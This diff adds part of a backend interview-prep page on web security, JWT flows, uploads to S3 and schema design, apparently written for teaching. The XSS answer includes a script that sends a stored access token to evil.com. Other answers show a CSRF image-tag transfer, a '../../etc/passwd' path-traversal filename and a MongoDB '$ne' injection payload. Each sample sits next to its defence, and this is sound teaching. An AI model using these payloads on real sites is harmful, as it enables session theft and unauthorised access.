+        <tr><th></th><th>httpOnly Cookies</th><th>localStorage</th></tr>
+        <tr><td>XSS</td><td>Safe — JS cannot access</td><td>Vulnerable — accessible to scripts</td></tr>
+        <tr><td>CSRF</td><td>Vulnerable — cookies auto-sent</td><td>Safe — not sent automatically</td></tr>
+        <tr><td>Auto-sent</td><td>Yes (browser handles)</td><td>No — must manually add to headers</td></tr>
+        <tr><td>Mobile friendly</td><td>Trickier</td><td>Easy in mobile/React Native</td></tr>
+        <tr><td>Recommended for</td><td>Web apps (with CSRF protection)</td><td>Mobile apps / SPAs with strict CSP</td></tr>
+      </table>
+      <pre><code>res.cookie('accessToken', token, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'Strict',
+  maxAge: 15 * 60 * 1000
+});</code></pre>
+      <p>Note this is fundamentally a tradeoff, not a strictly "better" option: httpOnly cookies eliminate XSS-based token theft but reintroduce CSRF risk (since the browser attaches them automatically to any request to that domain), while localStorage eliminates CSRF risk (nothing is sent automatically — you must explicitly attach the token to a header) but is fully exposed if any XSS vulnerability exists anywhere on the page. Neither is a silver bullet; the real defense is layering (httpOnly + SameSite + short expiry + CSP) rather than picking one storage mechanism and calling it done.</p>
+      <p><strong>Interview follow-up:</strong> "what would you actually ship in production?" — httpOnly + secure + SameSite=Strict/Lax cookies for the refresh token, paired with a short-lived access token kept only in memory (not even localStorage) on the client, refreshed silently via the cookie-backed refresh endpoint.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q35.</span> JWT flow (access + refresh token) end-to-end <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <pre><code>1. LOGIN
+   Client → POST /auth/login { email, password }
+   Server → Verifies credentials
+   Server → Issues:
+     • accessToken  (short-lived: 15min)
+     • refreshToken (long-lived: 7 days) — httpOnly cookie + DB
+
+2. AUTHENTICATED REQUEST
+   Client → GET /api/profile
+             Authorization: Bearer <accessToken>
+   Server → Validates signature + expiry → Returns data
+
+3. TOKEN REFRESH (when accessToken expires)
+   Client → POST /auth/refresh
+             Cookie: refreshToken=<token>
+   Server → Validates refreshToken against DB
+   Server → Issues new accessToken (optionally rotates refreshToken)
+
+4. LOGOUT
+   Client → POST /auth/logout
+   Server → Deletes refreshToken from DB, clears cookies</code></pre>
+      <pre><code>const generateTokens = (userId) => ({
+  accessToken: jwt.sign({ id: userId }, process.env.JWT_SECRET, { expiresIn: '15m' }),
+  refreshToken: jwt.sign({ id: userId }, process.env.REFRESH_SECRET, { expiresIn: '7d' })
+});
+
+app.post('/auth/refresh', async (req, res) => {
+  const { refreshToken } = req.cookies;
+  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });
+
+  const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
+  const stored = await Token.findOne({ userId: decoded.id, token: refreshToken });
+  if (!stored) return res.status(403).json({ error: 'Invalid refresh token' });
+
+  const { accessToken } = generateTokens(decoded.id);
+  res.json({ accessToken });
+});</code></pre>
+      <p>The two tokens exist for different reasons: the access token is short-lived and stateless — the server validates it purely by checking the signature, with no DB lookup, which is what makes JWTs fast and horizontally scalable. But that also means an access token can't be revoked before it expires (there's no server-side record to delete), which is exactly why it's kept short (minutes). The refresh token compensates — it's checked against the DB on every use, so it <em>can</em> be revoked instantly (logout, password change, suspected compromise), at the cost of a DB round-trip, which is acceptable since refresh happens far less often than API calls.</p>
+      <p><strong>Refresh token rotation</strong> (issuing a brand-new refresh token on every refresh and invalidating the old one) is considered best practice — if a stolen refresh token is used after the legitimate client already rotated it, the mismatch is detectable and the whole token family can be revoked, limiting the blast radius of a leaked token.</p>
+      <p><strong>Common pitfall:</strong> storing the access token in the same place as the refresh token (e.g., both in localStorage) — that defeats the entire design, since compromising one compromises both; keep the access token in memory only.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q36.</span> Bcrypt — why preferred for password hashing <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Bcrypt is designed to be slow on purpose — making brute-force attacks impractical.</p>
+      <p><strong>Why not MD5/SHA256?</strong> They're designed to be fast → millions of hashes/second → attackers can brute-force quickly.</p>
+      <p><strong>Why Bcrypt:</strong> salt (random data before hashing, same password → different hash), work factor/cost (configurable rounds, exponentially slower), future-proof (increase cost as hardware improves).</p>
+      <pre><code>const bcrypt = require('bcrypt');
+
+const hashedPassword = await bcrypt.hash(plainPassword, 12);
+const isMatch = await bcrypt.compare(plainPassword, hashedPassword);
+
+// "password" → $2b$12$XJHlKxf3r...      ← different each time (random salt)
+// "password" → $2b$12$mQpAb2F9k...</code></pre>
+      <p>The cost factor is exponential, not linear — each increment of the cost parameter (e.g., 10 → 12) doubles the work required, so choosing 12 vs 10 isn't "20% slower," it's roughly 4x slower. This is what lets teams "future-proof" a hashing scheme: as hardware gets faster, you bump the cost factor for newly-hashed passwords without needing a new algorithm. The salt (stored as part of the hash string itself, visible in that <code>$2b$12$...</code> prefix) defeats rainbow table attacks — precomputed hash tables become useless once every password gets a unique random salt, since the attacker would need a separate table per salt.</p>
+      <p><strong>Interview follow-up:</strong> "why not just add your own salt to SHA256?" — because SHA256 is still fast per-hash, so even with unique salts an attacker with GPUs can still brute-force a weak password quickly; bcrypt's deliberate slowness (and newer algorithms like Argon2, which also adds memory-hardness against GPU/ASIC attacks) is the actual point, not just the presence of a salt.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q37.</span> RBAC and how to implement it <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>Role-Based Access Control — assign permissions to roles, assign roles to users. Users get permissions indirectly through their role(s).</p>
+      <pre><code>{ name: 'Alice', role: 'admin' }
+{ name: 'Bob',  role: 'user' }
+
+const permissions = {
+  admin:  ['read', 'write', 'delete', 'manage_users'],
+  editor: ['read', 'write'],
+  user:   ['read']
+};
+
+const hasPermission = (permission) => (req, res, next) => {
+  const userPerms = permissions[req.user.role] || [];
+  if (!userPerms.includes(permission)) {
+    return res.status(403).json({ error: 'Insufficient permissions' });
+  }
+  next();
+};
+
+app.get('/posts',         authenticate, hasPermission('read'),        getPosts);
+app.post('/posts',        authenticate, hasPermission('write'),       createPost);
+app.delete('/posts/:id',  authenticate, hasPermission('delete'),      deletePost);
+app.get('/admin/users',   authenticate, hasPermission('manage_users'), getUsers);</code></pre>
+      <p>RBAC's core value is indirection: you assign permissions to a small, stable set of roles rather than to individual users, so adding a new employee or changing someone's access is a one-line role reassignment instead of editing a giant per-user permission list. Its limitation shows up with finer-grained needs — "can edit only their own posts" or "can access only resources in their department" can't be expressed by role alone, which is where ABAC (Attribute-Based Access Control, checking attributes like resource owner ID or department against the requester) or a hybrid RBAC+ownership check comes in.</p>
+      <p><strong>Common pitfall:</strong> hardcoding role names as magic strings scattered across the codebase — centralizing them as constants/enums avoids typos that silently fail permission checks (e.g., <code>'Admin'</code> vs <code>'admin'</code>) and makes adding a new role a single-file change.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q38.</span> CORS — what it is and how to handle it <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>CORS is a browser security mechanism that blocks web pages from making requests to a different origin (domain, port, protocol) than the one that served the page.</p>
+      <pre><code>Frontend: http://localhost:3000
+Backend:  http://localhost:5000   ← different port = different origin → CORS blocked!</code></pre>
+      <pre><code>const cors = require('cors');
+
+// Dev only
+app.use(cors());
+
+// Production
+app.use(cors({
+  origin: ['https://myapp.com', 'https://www.myapp.com'],
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization']
+}));</code></pre>
+      <p>CORS is a browser restriction — Postman/curl are unaffected; server-to-server calls also bypass CORS.</p>
+      <p>It's worth being precise about what CORS actually prevents: the cross-origin request is usually still sent by the browser and the server still processes it — CORS controls whether the <em>browser hands the response back to the calling JavaScript</em>. For "simple" requests (GET/POST with standard headers) the request goes out and the server's response is just blocked from being read by the page's JS if the <code>Access-Control-Allow-Origin</code> header doesn't match. For "non-simple" requests (custom headers, PUT/DELETE, <code>Content-Type: application/json</code>), the browser first sends an OPTIONS <strong>preflight</strong> request, and only fires the real request if the preflight response approves it.</p>
+      <p><strong>Interview follow-up:</strong> "why does <code>credentials: true</code> plus a wildcard origin fail?" — the CORS spec explicitly forbids combining <code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code>, since that combination would let any site read authenticated responses; you must echo back a specific origin when credentials are involved.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q39.</span> CSRF and prevention with cookies <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>An attacker tricks a logged-in user's browser into making an unintended request (cookies are sent automatically).</p>
+      <pre><code>1. User is logged into bank.com (cookie: sessionToken=abc)
+2. User visits evil.com
+3. evil.com has: &lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;
+4. Browser sends request WITH the cookie automatically → transfer happens!</code></pre>
+      <pre><code>// Option 1: SameSite cookie attribute (best defense)
+res.cookie('sessionToken', token, {
+  sameSite: 'Strict',
+  httpOnly: true,
+  secure: true
+});
+
+// Option 2: CSRF tokens
+const csrf = require('csurf');
+app.use(csrf({ cookie: true }));
+app.get('/form', (req, res) => {
+  res.render('form', { csrfToken: req.csrfToken() });
+});</code></pre>
+      <p>The reason SameSite is now considered the primary defense (rather than CSRF tokens) is that it's a browser-enforced attribute set once on the cookie, requiring no per-form token plumbing: <code>Strict</code> never sends the cookie on cross-site navigation at all (even a click-through link), while <code>Lax</code> (the modern browser default) allows it for top-level GET navigations but blocks it for cross-site POSTs — which is exactly the attack vector CSRF exploits. Note CSRF is only a risk for cookie-based auth; if your API uses a bearer token in an <code>Authorization</code> header (not auto-attached by the browser), CSRF doesn't apply at all, since the attacker's page has no way to set that header on a cross-origin request.</p>
+      <p><strong>Common pitfall:</strong> relying on SameSite alone for older-browser support or for state-changing GET requests (which shouldn't exist per REST/HTTP semantics but sometimes do in legacy code) — <code>Lax</code> still allows top-level GET navigations to carry the cookie, so a GET-based state change is still exploitable via a simple link or image tag.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q40.</span> XSS and its impact on token storage <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>XSS — attacker injects malicious JS into your page, which executes in other users' browsers.</p>
+      <pre><code>&lt;script&gt;
+  // If token is in localStorage, attacker can steal it:
+  fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'));
+&lt;/script&gt;</code></pre>
+      <p>localStorage/sessionStorage → accessible by JS → stolen by XSS. httpOnly cookies → not accessible by JS → XSS-safe.</p>
+      <pre><code>const sanitizeHtml = require('sanitize-html');
+const clean = sanitizeHtml(userInput);
+
+res.setHeader('Content-Security-Policy', "default-src 'self'");
+
+const helmet = require('helmet');
+app.use(helmet());</code></pre>
+      <p>There are two main flavors worth distinguishing in an interview: <strong>stored XSS</strong> (malicious script saved to the DB — e.g., in a comment — and served to every viewer, as in the snippet above) is the more dangerous variant because it compounds automatically; <strong>reflected XSS</strong> (the payload comes from the current request, like a query param echoed unescaped into the page) requires tricking a victim into clicking a crafted link. Both are prevented the same way: never render untrusted input as raw HTML — escape on output (React does this by default for JSX text, which is why <code>dangerouslySetInnerHTML</code> is named the way it is) and sanitize any input that must allow limited HTML (rich text editors).</p>
+      <p><strong>Interview follow-up:</strong> "if tokens are only in httpOnly cookies, is XSS harmless?" — no; even without stealing the token, XSS lets an attacker make authenticated requests directly from the victim's browser (since cookies are attached automatically) or manipulate the DOM/exfiltrate other sensitive on-page data — httpOnly only stops token theft specifically, not the underlying vulnerability.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q41.</span> Rate limiting — what and where <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <pre><code>const rateLimit = require('express-rate-limit');
+
+app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 })); // global
+
+const authLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 10,
+  message: 'Too many login attempts. Try again later.',
+  standardHeaders: true,
+  skipSuccessfulRequests: true
+});
+app.use('/auth', authLimiter);</code></pre>
+      <table>
+        <tr><th>Layer</th><th>Pros</th><th>Cons</th></tr>
+        <tr><td>API Gateway (Nginx, AWS)</td><td>Blocks before hitting app</td><td>Additional infrastructure</td></tr>
+        <tr><td>App level (express-rate-limit)</td><td>Easy, fine-grained per-route</td><td>Bypassed across instances (use Redis store)</td></tr>
+        <tr><td>CDN (Cloudflare)</td><td>Blocks at edge, globally</td><td>Costs money</td></tr>
+      </table>
+      <p>The "bypassed across instances" caveat on app-level limiting is important in practice: <code>express-rate-limit</code>'s default in-memory store tracks counts per process, so with 4 clustered instances behind a load balancer, a client can actually make up to 4x the configured limit if requests get distributed round-robin across workers. A shared store (Redis, via <code>rate-limit-redis</code>) is required for the limit to hold globally across all instances.</p>
+      <p><strong>Common pitfall:</strong> rate-limiting purely by IP address — this misfires for users behind NAT/corporate proxies (many legitimate users share one IP and get limited together) and is trivially bypassed by an attacker rotating IPs; combining IP-based limits with per-account/per-token limits gives more meaningful protection, especially on auth endpoints.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q42.</span> Input validation vs sanitization <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>Validation</th><th>Sanitization</th></tr>
+        <tr><td>Purpose</td><td>Check if data is in correct format</td><td>Clean/transform data to remove harmful content</td></tr>
+        <tr><td>Action on failure</td><td>Reject the request (400)</td><td>Modify the data silently</td></tr>
+        <tr><td>Examples</td><td>Is email valid? Is age a number?</td><td>Remove &lt;script&gt; tags, trim whitespace, escape HTML</td></tr>
+      </table>
+      <pre><code>const { body, validationResult } = require('express-validator');
+
+app.post('/users',
+  body('email').isEmail().normalizeEmail(),
+  body('age').isInt({ min: 0, max: 120 }),
+  body('name').trim().notEmpty().isLength({ max: 50 }),
+  body('bio').escape(),
+
+  async (req, res) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) {
+      return res.status(400).json({ errors: errors.array() });
+    }
+  }
+);</code></pre>
+      <p>Do it at the entry point — middleware/controller — before it reaches business logic or the DB. Never trust client-sent data.</p>
+      <p>The two are complementary, not interchangeable: validation is a gate (reject if wrong shape), sanitization is a filter (clean and continue). Relying on sanitization alone can silently corrupt legitimate data (auto-stripping characters a user actually meant to type), while relying on validation alone still lets syntactically-valid-but-dangerous content through (a well-formed but script-laden HTML string passes an "is this a string" check easily). Defense in depth means validating input shape at the API boundary, sanitizing anything that will later be rendered as HTML, and additionally using parameterized queries/ORM methods so even a missed validation can't become a SQL/NoSQL injection.</p>
+      <p><strong>Interview follow-up:</strong> "where's the actual injection risk in MongoDB?" — operator injection, e.g., a client sending <code>{ "email": { "$ne": null } }</code> as a JSON body field instead of a string, which can bypass a naive <code>find({ email: req.body.email })</code> login check; validating that expected fields are actually strings (not objects) closes this specific hole.</p>
+    </div>
+  </details>
+
+  <h2 class="section-heading">6. File Uploads &amp; AWS S3</h2>
+
+  <details class="qa">
+    <summary><span class="q-num">Q43.</span> What is Multer and why is it used? <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <p>Multer is Express middleware for handling multipart/form-data — the encoding type used for file uploads. Without it, body-parser can't parse binary file data.</p>
+      <pre><code>const multer = require('multer');
+
+const upload = multer({
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 5 * 1024 * 1024 },
+  fileFilter: (req, file, cb) => {
+    const allowed = ['image/jpeg', 'image/png', 'image/webp'];
+    if (allowed.includes(file.mimetype)) cb(null, true);
+    else cb(new Error('Only images allowed'), false);
+  }
+});
+
+const diskUpload = multer({
+  storage: multer.diskStorage({
+    destination: './uploads/',
+    filename: (req, file, cb) => {
+      cb(null, `${Date.now()}-${file.originalname}`);
+    }
+  })
+});
+
+app.post('/upload/single', upload.single('avatar'), (req, res) => {
+  res.json({ message: 'Uploaded', filename: req.file.originalname });
+});
+
+app.post('/upload/multiple', upload.array('photos', 10), (req, res) => {
+  // req.files = array of file objects
+});</code></pre>
+      <p>The storage engine choice matters operationally: <code>memoryStorage</code> buffers the whole file in RAM as a <code>Buffer</code>, which is convenient for immediately forwarding to S3 but dangerous for large files at scale — many concurrent large uploads can exhaust process memory since each one holds its entire content in the single Node heap. <code>diskStorage</code> streams to disk instead, bounding memory use but requiring cleanup logic (temp files that must be deleted after processing) and enough local disk space, which is awkward in containerized/serverless environments with ephemeral or limited storage.</p>
+      <p><strong>Common pitfall:</strong> trusting <code>file.mimetype</code> in the <code>fileFilter</code> — that value comes straight from the client-supplied <code>Content-Type</code> header in the multipart body and can be spoofed trivially; it's a first filter, not a security boundary (see Q47 for the actual mitigation).</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q44.</span> Upload pipeline: server upload vs direct-to-cloud <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <pre><code>Option 1: Upload through server
+Client → POST /upload (multipart) → Express (Multer) → Upload to S3 → Response</code></pre>
+      <pre><code>const { S3Client, PutObjectCommand } = require('@aws-sdk/client-s3');
+const s3 = new S3Client({ region: 'ap-south-1' });
+
+app.post('/upload', upload.single('file'), async (req, res) => {
+  const key = `uploads/${Date.now()}-${req.file.originalname}`;
+  await s3.send(new PutObjectCommand({
+    Bucket: process.env.S3_BUCKET,
+    Key: key,
+    Body: req.file.buffer,
+    ContentType: req.file.mimetype
+  }));
+  res.json({ url: `https://${process.env.S3_BUCKET}.s3.amazonaws.com/${key}` });
+});</code></pre>
+      <pre><code>Option 2: Direct-to-cloud (pre-signed URL) — Recommended
+Client → GET /upload-url → Server generates pre-signed URL → Client uploads directly to S3
+                                                               ↓
+                                              Client → notify server with S3 key</code></pre>
+      <table>
+        <tr><th></th><th>Server Upload</th><th>Direct to Cloud</th></tr>
+        <tr><td>Bandwidth</td><td>Uses server bandwidth</td><td>Saves server bandwidth</td></tr>
+        <tr><td>Speed</td><td>Slower (two hops)</td><td>Faster (direct to S3)</td></tr>
+        <tr><td>Server load</td><td>High (large files)</td><td>Low</td></tr>
+        <tr><td>Control</td><td>Full (validate before upload)</td><td>Partial (validate after)</td></tr>
+      </table>
+      <p>Direct-to-cloud isn't purely "better" — since the server never sees the bytes, virus scanning, image transformation, or content moderation must either happen via an S3 event trigger (Lambda on upload, e.g., via S3 Event Notifications) after the fact, or the file must be rejected/deleted post-hoc if it fails checks. Server-upload is usually the right call whenever you need synchronous validation before accepting the file (e.g., rejecting an invalid file with an immediate error, rather than accepting it and cleaning up later).</p>
+      <p><strong>Interview follow-up:</strong> "how do you enforce file-size/type limits with the direct-to-cloud approach if the server never touches the bytes?" — pre-signed POST policies (as opposed to plain pre-signed PUT URLs) let you embed conditions (max content-length, allowed content-type) directly into the signed policy document, which S3 itself enforces at upload time.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q45.</span> AWS S3 conceptually and access control <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p><strong>Bucket</strong> — top-level container, name must be globally unique. <strong>Object</strong> — a file stored in a bucket (up to 5TB). <strong>Key</strong> — the object's path/name within the bucket.</p>
+      <pre><code>s3://my-bucket/avatars/user1/photo.jpg
+       └──────┘ └─────────────────────┘
+       bucket            key</code></pre>
+      <pre><code>// IAM Policy
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": ["s3:PutObject", "s3:GetObject"],
+    "Resource": "arn:aws:s3:::my-bucket/*"
+  }]
+}</code></pre>
+      <p>Block public access for sensitive data — use pre-signed URLs for access instead.</p>
+      <p>IAM policies operate at the AWS-account/service level (which users/roles can call which S3 API actions), while <strong>bucket policies</strong> and object ACLs operate at the resource level (who can access this specific bucket/object) — a request needs to be allowed by both layers if both are present, since S3 evaluates the union of applicable policies and denies by default unless something explicitly allows it. This is why "public read" misconfigurations happen: a permissive bucket policy plus a permissive IAM role can combine to expose data that neither alone would have exposed.</p>
+      <p><strong>Interview follow-up:</strong> "what's the actual production-safe default?" — Block Public Access enabled at the account and bucket level, IAM roles scoped to least privilege (only the specific prefixes/actions the app needs, e.g., <code>s3:PutObject</code> on <code>uploads/*</code> only, not the whole bucket), and access to individual objects mediated entirely through pre-signed URLs generated server-side after your own authorization check.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q46.</span> What is a pre-signed URL and why recommended? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <p>A temporary URL granting time-limited access to a private S3 object without making it public.</p>
+      <pre><code>const { S3Client, PutObjectCommand, GetObjectCommand } = require('@aws-sdk/client-s3');
+const { getSignedUrl } = require('@aws-sdk/s3-request-presigner');
+
+const s3 = new S3Client({ region: 'ap-south-1' });
+
+app.get('/upload-url', authenticate, async (req, res) => {
+  const key = `uploads/${req.user.id}/${Date.now()}.jpg`;
+  const command = new PutObjectCommand({
+    Bucket: process.env.S3_BUCKET,
+    Key: key,
+    ContentType: 'image/jpeg'
+  });
+  const url = await getSignedUrl(s3, command, { expiresIn: 300 });
+  res.json({ uploadUrl: url, key });
+});
+
+app.get('/download-url/:key', authenticate, async (req, res) => {
+  const command = new GetObjectCommand({
+    Bucket: process.env.S3_BUCKET,
+    Key: req.params.key
+  });
+  const url = await getSignedUrl(s3, command, { expiresIn: 3600 });
+  res.json({ downloadUrl: url });
+});</code></pre>
+      <p><strong>Why recommended:</strong> keeps bucket private, client uploads directly (saves server bandwidth), URL expires, server doesn't handle large file streams.</p>
+      <p>Mechanically, a pre-signed URL is just the normal S3 request (method, path, headers) with a signature computed using your AWS credentials and a set of query parameters (expiry timestamp, signed headers) appended — S3 recomputes the same signature on request and rejects it if the signature doesn't match or the expiry has passed. That means the server never actually proxies the file; it only needs its AWS credentials to compute the signature, which is why it scales so well (no bandwidth or CPU cost per upload).</p>
+      <p><strong>Common pitfall:</strong> generating an upload URL without constraining <code>ContentType</code>/size and without the server verifying afterward what actually landed in the bucket (via a subsequent HEAD request or S3 event trigger) — a malicious client can upload something entirely different from what the pre-signed URL was ostensibly issued for, since the signature only restricts the request shape you specified, not deeper content inspection.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q47.</span> Common security concerns in file upload systems <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th>Threat</th><th>Risk</th><th>Mitigation</th></tr>
+        <tr><td>Type spoofing</td><td>Rename malware.exe → photo.jpg</td><td>Check MIME type from magic bytes, not extension</td></tr>
+        <tr><td>Size limits</td><td>1GB upload crashes server</td><td>Enforce limits.fileSize in Multer</td></tr>
+        <tr><td>Malware</td><td>Upload virus-infected file</td><td>Scan with ClamAV / AWS GuardDuty</td></tr>
+        <tr><td>Path traversal</td><td>Filename ../../etc/passwd</td><td>Sanitize filenames, use UUIDs as keys</td></tr>
+        <tr><td>Stored XSS</td><td>Upload .html served inline</td><td>Never serve uploads from your domain; use S3/CDN</td></tr>
+        <tr><td>Overwriting files</td><td>Same filename overwrites existing</td><td>Prefix with user ID + timestamp + UUID</td></tr>
+      </table>
+      <pre><code>const { v4: uuidv4 } = require('uuid');
+const path = require('path');
+
+const safeKey = (originalName) => {
+  const ext = path.extname(originalName).toLowerCase();
+  const allowedExts = ['.jpg', '.jpeg', '.png', '.pdf'];
+  if (!allowedExts.includes(ext)) throw new Error('Invalid file type');
+  return `uploads/${uuidv4()}${ext}`;
+};</code></pre>
+      <p>"Check MIME type from magic bytes, not extension" is worth expanding on: file-type detection libraries (like <code>file-type</code>) read the first few bytes of the actual file content (the "magic number" — e.g., PNG files always start with a specific 8-byte signature) rather than trusting the filename or client-supplied <code>Content-Type</code>, since both of those are attacker-controlled strings that prove nothing about the actual bytes. This catches the classic attack of renaming a malicious script to <code>photo.jpg</code>.</p>
+      <p><strong>Interview follow-up:</strong> "why is serving user uploads from your own domain dangerous even with type checks?" — because a same-origin-served file inherits your site's origin for cookies/CSP purposes; serving from a separate subdomain or S3/CloudFront origin (with no cookies attached) means even if a hostile file slips through, it can't execute in the context of your authenticated session.</p>
+    </div>
+  </details>
+
+  <h2 class="section-heading">7. System Design Concepts</h2>
+
+  <details class="qa">
+    <summary><span class="q-num">Q48.</span> Design an e-commerce schema: User, Product, Order <span class="priority">***</span></summary>
+    <div class="qa-body">
+      <pre><code>// MongoDB / Mongoose
+const userSchema = new Schema({
+  name:     { type: String, required: true },
+  email:    { type: String, unique: true, required: true },
+  password: String,
+  address:  { street: String, city: String, state: String, pincode: String },
+  role:     { type: String, enum: ['customer', 'admin'], default: 'customer' }
+});
+
+const productSchema = new Schema({
+  name:        { type: String, required: true },
+  description: String,
+  price:       { type: Number, required: true, min: 0 },
+  stock:       { type: Number, default: 0 },
+  category:    String,
+  images:      [String],
+  seller:      { type: Schema.Types.ObjectId, ref: 'User' }
+});
+
+const orderSchema = new Schema({
+  user:     { type: Schema.Types.ObjectId, ref: 'User', required: true },
+  items: [{
+    product:  { type: Schema.Types.ObjectId, ref: 'Product' },
+    quantity: Number,
+    price:    Number
+  }],
+  totalAmount: Number,
+  status:      { type: String, enum: ['pending', 'confirmed', 'shipped', 'delivered', 'cancelled'], default: 'pending' },
+  shippingAddress: { street: String, city: String, state: String, pincode: String },
+  paymentStatus:   { type: String, enum: ['pending', 'paid', 'refunded'] },
+  createdAt:       { type: Date, default: Date.now }
+});</code></pre>
+      <pre><code>-- SQL equivalent (PostgreSQL)
+CREATE TABLE users (
+  id         SERIAL PRIMARY KEY,
+  name       VARCHAR(100) NOT NULL,
+  email      VARCHAR(100) UNIQUE NOT NULL,
+  password   TEXT,
+  role       VARCHAR(20) DEFAULT 'customer',
+  created_at TIMESTAMP DEFAULT NOW()
+);
+
+CREATE TABLE products (
+  id          SERIAL PRIMARY KEY,
+  name        VARCHAR(200) NOT NULL,
+  price       DECIMAL(10,2) NOT NULL,
+  stock       INT DEFAULT 0,
+  category    VARCHAR(100),
+  seller_id   INT REFERENCES users(id)
+);
+
+CREATE TABLE orders (
+  id               SERIAL PRIMARY KEY,
+  user_id          INT REFERENCES users(id),
+  total_amount     DECIMAL(10,2),
+  status           VARCHAR(50) DEFAULT 'pending',
+  created_at       TIMESTAMP DEFAULT NOW()
+);
+
+CREATE TABLE order_items (
+  id         SERIAL PRIMARY KEY,
+  order_id   INT REFERENCES orders(id),
+  product_id INT REFERENCES products(id),
+  quantity   INT,
+  price      DECIMAL(10,2)
+);</code></pre>
+      <p>The design choices worth calling out explicitly in an interview: <code>items</code> is embedded inside the Mongo order document rather than referenced, because order line items are always read together with the order, never queried independently, and don't grow unboundedly (a handful of products per order) — a textbook case for embedding (see Q32). <code>price</code> is duplicated onto the order/order_items row rather than only referencing the live product price, deliberately — an order must preserve the price at time of purchase even if the product's price changes later; joining live to <code>products.price</code> would incorrectly rewrite historical order totals.</p>
+      <p><strong>Interview follow-up:</strong> "how would you handle stock decrement safely under concurrent orders?" — wrap the stock check + decrement + order creation in a transaction (Q30), and use an atomic conditional update (<code>updateOne({ _id, stock: { $gte: qty } }, { $inc: { stock: -qty } })</code> in Mongo, or <code>UPDATE ... WHERE stock &gt;= qty</code> in SQL) so two simultaneous orders can't both pass a stale stock check and oversell the same unit.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q49.</span> One-to-many vs many-to-many: Mongo vs SQL <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <pre><code>// One-to-many (User → Orders)
+// MongoDB — reference
+{ _id: "order1", userId: ObjectId("user1"), items: [...] }
+// Query: Order.find({ userId: req.user.id })
+
+-- SQL — foreign key
+CREATE TABLE orders (user_id INT REFERENCES users(id));
+-- Query: SELECT * FROM orders WHERE user_id = 1;</code></pre>
+      <pre><code>// Many-to-many (Students ↔ Courses)
+// MongoDB — array of references
+{ _id: "student1", courseIds: [ObjectId("c1"), ObjectId("c2")] }
+
+-- SQL — junction (join) table
+CREATE TABLE student_courses (
+  student_id INT REFERENCES students(id),
+  course_id  INT REFERENCES courses(id),
+  enrolled_at TIMESTAMP,
+  PRIMARY KEY (student_id, course_id)
+);
+-- Query: JOIN student_courses ON students.id = student_courses.student_id</code></pre>
+      <p>The junction/join table in SQL isn't just a modeling convenience — it's where relationship-specific data lives (<code>enrolled_at</code>, a grade, a role in the relationship) that doesn't belong to either side alone; MongoDB's array-of-references approach struggles here, since attaching per-relationship metadata means either embedding a small sub-document per reference (<code>[{ courseId, enrolledAt }]</code>) instead of a bare ID array, or introducing a genuine third collection that mimics the junction-table pattern anyway.</p>
+      <p><strong>Interview follow-up:</strong> "what happens to a many-to-many array of references at scale?" — an array of IDs on both sides (student has courseIds, course has studentIds) becomes hard to keep in sync and can grow unbounded on the "many" side (a popular course with 100,000 students) — the standard MongoDB answer is to keep the reference array only on the side with a naturally bounded count (a student's courses, typically small) and query the inverse direction with an indexed query instead of a mirrored array (<code>Course.find({ studentIds: studentId })</code>) rather than a mirrored array on the student.</p>
+    </div>
+  </details>
+
+  <details class="qa">
+    <summary><span class="q-num">Q50.</span> What are webhooks? How do they differ from polling? <span class="priority">**</span></summary>
+    <div class="qa-body">
+      <table>
+        <tr><th></th><th>Polling</th><th>Webhooks</th></tr>
+        <tr><td>Mechanism</td><td>Client repeatedly asks "any updates?"</td><td>Server pushes updates when they happen</td></tr>
+        <tr><td>Efficiency</td><td>Wasteful — most calls return nothing</td><td>Efficient — only fires on events</td></tr>
+        <tr><td>Latency</td><td>Depends on poll interval</td><td>Near real-time</td></tr>
+        <tr><td>Complexity</td><td>Simple</td><td>Server needs a public URL</td></tr>
+        <tr><td>Use cases</td><td>Simple status checks</td><td>Payment events, GitHub events, Stripe</td></tr>
+      </table>
